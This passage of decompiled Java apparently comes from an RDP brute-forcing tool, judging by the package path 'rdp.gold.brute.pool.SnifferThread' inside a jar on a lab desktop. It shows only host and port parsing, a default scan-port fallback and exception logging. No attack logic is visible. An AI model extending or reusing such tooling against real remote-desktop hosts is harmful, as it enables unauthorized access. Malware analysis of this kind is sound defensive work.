/*     */       
/* 599 */       logger.error(e.getMessage() + sw.toString());
/*     */     }
/*     */   }
/*     */   
/*     */   public List<Integer> getPorts() throws Exception {
/* 604 */     return getPorts(this.port);
/*     */   }
/*     */   
/*     */   private void parseHost(String host) throws Exception {
/*     */     try {
/* 609 */       Matcher matcherIp = Config.PATTERN_IP_PORT.matcher(host);
/*     */       
/* 611 */       this.host = host;
/*     */       
/* 613 */       if (matcherIp.find()) {
/* 614 */         String[] rdp = matcherIp.group(1).split(":");
/*     */         
/* 616 */         this.ip = rdp[0];
/* 617 */         this.port = rdp[1];
/*     */         
/* 619 */         this.isSaveHost = Boolean.valueOf(true);
/*     */       } else {
/* 621 */         this.ip = host;
/* 622 */         this.port = Config.PORT_SCAN;
/*     */       }
/*     */     } catch (Exception e) {
/* 625 */       StringWriter sw = new StringWriter();
/* 626 */       e.printStackTrace(new PrintWriter(sw));
/* 627 */       logger.error(e.getMessage() + sw.toString());
/*     */       
/* 629 */       throw e;
/*     */     }
/*     */   }
/*     */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\pool\SnifferThread.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */